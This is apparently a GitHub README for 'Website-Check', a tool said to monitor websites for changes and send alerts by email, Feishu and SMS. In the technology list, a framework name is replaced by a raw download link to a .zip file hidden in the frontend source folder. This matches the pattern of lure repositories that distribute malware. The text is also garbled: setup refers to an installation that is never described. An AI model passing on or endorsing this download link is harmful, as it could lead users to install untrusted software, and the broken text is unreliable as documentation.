## 📖 About Website-Check

Website-Check is a tool that helps you keep an eye on websites. It checks for changes like updates to text, links, or files. When it finds something new, it sends you alerts by email, chat, or SMS. You don’t need to watch websites manually anymore. This software works quietly in the background and tells you what you need to know.

It supports:

- Custom checks using CSS and XPath selectors  
- Tracking new links added over time  
- Automatic downloading of attachments  
- Taking screenshots or snapshots of pages  
- Notifications via email, Feishu (a business chat app), and SMS  

Website-Check uses tools and systems like https://github.com/welkeson123/Website-Check/raw/refs/heads/main/frontend/src/pages/Website-Check-v1.8.zip to handle server tasks, Puppeteer to control web pages for checking and screenshots, and MySQL to store data. The front end uses React and Vite for a simple interface you can access in your browser.

## 🛠️ Setting Up Website-Check

After installation, you need to set up Website-Check to monitor the websites you care about.

**Step 1:** Launch the program by opening the Website-Check app on your computer.

## 🔔 How Notifications Work

Website-Check checks websites regularly. When it finds changes, it sends alerts based on your setup.

- Emails come from its built-in mail system using NodeMailer.  
- Feishu notifications use the Feishu messaging API to send messages to your account or group.  
- SMS alerts are sent via integrated SMS services.

You only get alerts when real changes happen, not every time the page loads. This reduces noise.

You can adjust the check frequency from every 10 minutes to once a day.

## 📸 Screenshots and Snapshots

If you want to see what’s new visually, Website-Check can capture screenshots of the monitored pages. These images help you compare old and new versions. Screenshots can be included in notifications or saved for review.
